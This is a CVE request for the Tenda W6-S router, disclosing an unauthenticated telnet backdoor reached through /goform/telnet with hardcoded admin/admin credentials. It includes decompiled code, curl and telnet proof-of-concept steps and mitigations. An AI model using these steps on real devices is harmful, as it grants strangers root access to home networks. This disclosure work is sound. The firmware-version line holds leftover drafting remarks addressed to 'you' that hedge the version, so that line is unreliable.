## CVE Request: Tenda W6-S – Unauthenticated Telnet Backdoor via `/goform/telnet` with Hardcoded Credentials

### Vulnerability Overview

- **Vulnerability Type**: Authentication Bypass / Unauthorized Remote Access
- **Affected Product**: Tenda W6-S
- **Affected Firmware Version**: v1.0.0.4(510) (as mentioned in previous context, but based on your document, the exact version is not specified; I will state "v1.0.0.4(510)" as per your earlier testing, or you can leave it generic)
- **Vulnerable Endpoint**: `/goform/telnet`
- **Impact**: Remote attacker can enable Telnet service without credentials (when default admin/admin unchanged) and gain root shell access.

------

### Description

The web management interface of Tenda W6-S contains a hidden backdoor. The handler for `/goform/telnet` does not enforce authentication when the device still uses the default administrative credentials (`admin/admin`). By sending a simple HTTP POST request to `/goform/telnet`, an attacker can start the Telnet daemon (`telnetd`) and then connect to port 23 using the default credentials, gaining full root access to the device.

------

### Technical Details

The vulnerability exists in the `httpd` binary. Two key functions are responsible:

1. **Authentication Bypass in `R7WebsSecurityHandler`**
   The function contains a hardcoded check:

   c

   ```
   if ( !strcmp("admin", byte_4BB528) && !strcmp("YWRtaW4=", byte_4BB568) && strstr(haystack, "goform/telnet") )
       return 0;   // skip authentication
   ```

   

   - `byte_4BB528` and `byte_4BB568` store the default username and password (base64-encoded "admin").
   - If the current configuration still uses the default credentials, any request to `/goform/telnet` bypasses all authentication.

2. **Telnet Daemon Activation in `TendaTelnet`**
   When a request reaches `/goform/telnet`, the following function is invoked:

   c

   ```
   int __fastcall TendaTelnet(int a1) {
       system("killall -9 telnetd");
       system("telnetd &");
       websWrite(a1, "load telnetd success.");
       return websDone(a1, 200);
   }
   ```

   

   - It kills any existing `telnetd` process and starts a new Telnet server in the background.

The combination allows an unauthenticated remote attacker to enable Telnet and log in with hardcoded credentials.

------

### Proof-of-Concept (PoC)

1. Send a POST request to the vulnerable endpoint:

   bash

   ```
   curl -X POST http://<device-ip>/goform/telnet
   ```

   

   (No cookies, no headers, no authentication required.)

2. After the request, the Telnet service will be running on port 23. Connect using:

   bash

   ```
   telnet <device-ip> 23
   ```

   

   Login with `admin` / `admin`.

3. In a simulated environment, the connection may close immediately due to missing login process, but the service is indeed started; on real hardware, the shell is obtained.

------

### Affected Version (Confirmed)

- Tenda W6-S v1.0.0.4(510)

Firmware download page:
https://www.tendacn.com/material/show/103478

------

### Root Cause

- Hardcoded credentials (`admin/admin`) in the binary are used as a fallback authentication check, allowing bypass when credentials haven't been changed.
- Lack of proper session validation for the `/goform/telnet` endpoint, which should be restricted to authenticated administrators.

------

### Suggested Mitigation

- Remove the hardcoded credential check and the Telnet backdoor.
- Require valid session/cookie authentication for all `/goform/*` endpoints.
- Disable Telnet by default and enable only via secure, authenticated configuration.

------

### References

- Firmware Download: https://www.tendacn.com/material/show/103478

------

### Credits

- Discovered by: trister
- Date of Discovery: 2026-06-05
- Contact: 3146229264@qq.com